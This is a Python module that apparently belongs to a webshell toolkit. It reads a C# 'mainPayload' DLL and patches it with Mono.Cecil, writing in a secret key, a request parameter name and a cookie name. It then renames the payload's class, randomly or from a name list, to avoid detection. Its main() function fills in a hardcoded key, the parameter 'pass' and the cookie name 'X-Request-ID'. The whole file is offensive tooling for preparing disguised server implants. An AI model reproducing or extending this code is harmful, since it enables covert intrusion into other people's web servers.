import os
import random
import string

class CsharpPayload:
    def __init__(self):
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.payload_dir = os.path.join(self.base_dir, "payload")

    def patch_dll_payload(self,dll_data,secret_key,param_name,cookie_name,class_name=None):
        placeholders = {
            "$SECRETKEY$": secret_key or "",
            "$PARAMNAME$": param_name or "",
            "$COOKIENAME$": cookie_name or ""
        }

        try:
            import clr
            import System
        except Exception as e:
            raise RuntimeError("pythonnet is required to use Mono.Cecil in Python") from e

        cecil_path = os.path.join(self.payload_dir, "Mono.Cecil.dll")
        if os.path.isfile(cecil_path):
            clr.AddReference(cecil_path)
        else:
            clr.AddReference("Mono.Cecil")

        from Mono.Cecil import AssemblyDefinition

        data_array = System.Array[System.Byte](dll_data)
        in_stream = System.IO.MemoryStream(data_array)
        assembly = AssemblyDefinition.ReadAssembly(in_stream)

        replaced = {key: 0 for key in placeholders.keys()}
        renamed_class = 0
        for module in assembly.Modules:
            for t in module.Types:
                if class_name and t.Name == "GKD":
                    t.Name = class_name
                    renamed_class += 1
                for field in t.Fields:
                    if not field.HasConstant:
                        continue
                    if field.Constant is None:
                        continue
                    value = str(field.Constant)
                    if value in placeholders:
                        field.Constant = placeholders[value]
                        replaced[value] += 1
                for method in t.Methods:
                    if not method.HasBody:
                        continue
                    for instr in method.Body.Instructions:
                        if instr.OpCode.Name != "ldstr":
                            continue
                        if instr.Operand is None:
                            continue
                        literal = str(instr.Operand)
                        if literal in placeholders:
                            instr.Operand = placeholders[literal]
                            replaced[literal] += 1

        missing = [k for k, v in replaced.items() if v == 0]
        if missing:
            raise ValueError(f"placeholders not found in dll: {', '.join(missing)}")
        if class_name and renamed_class == 0:
            raise ValueError("class name GKD not found in dll")

        out_stream = System.IO.MemoryStream()
        assembly.Write(out_stream)
        return bytes(out_stream.ToArray())

    def generateRandomClassName(self, length=6):
        """设置随机类名"""
        # 首字母必须是字母
        first = random.choice(string.ascii_letters)
        # 后续字符可以是字母或数字
        rest = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length - 1))
        return first + rest
    
    def get_class_name(self,method,specified_name=None):
        method = (method or "").strip().lower()
        if method == "random":
            return self.generateRandomClassName()
        if method == "dictionary":
            dict_path = os.path.join(self.payload_dir, "classNames.txt")
            if not os.path.isfile(dict_path):
                raise FileNotFoundError(f"classNames.txt not found: {dict_path}")
            with open(dict_path, "r", encoding="utf-8") as file:
                names = [line.strip() for line in file if line.strip()]
            if not names:
                raise ValueError("classNames.txt is empty")
            return random.choice(names)
        if method == "specified":
            if not specified_name:
                raise ValueError("specified_name is required when method='specified'")
            return specified_name
        raise ValueError(f"unknown method: {method}")

    def getPayload(self,payload_name,secret_key=None,param_name=None,cookie_name=None,obfuscation_method='specified',specified_name=None):
        payload_file = os.path.join(self.payload_dir, f"{payload_name}.dll")
        class_name = self.get_class_name(obfuscation_method,specified_name)
        with open(payload_file, 'rb') as file:
            payload_content = file.read()
        if "mainPayload" in payload_name:
            payload_content = self.patch_dll_payload(payload_content, secret_key, param_name, cookie_name, class_name)
            """ with open(os.path.join(self.payload_dir, f"{payload_name}_patched.dll"), 'wb') as file:
                file.write(payload_content) """
        return payload_content

def main():
    payload = CsharpPayload()
    payload_content = payload.getPayload("mainPayload", "3c6e0b8a9c15224a", "pass", "X-Request-ID")


if __name__ == "__main__":
    main()
    
    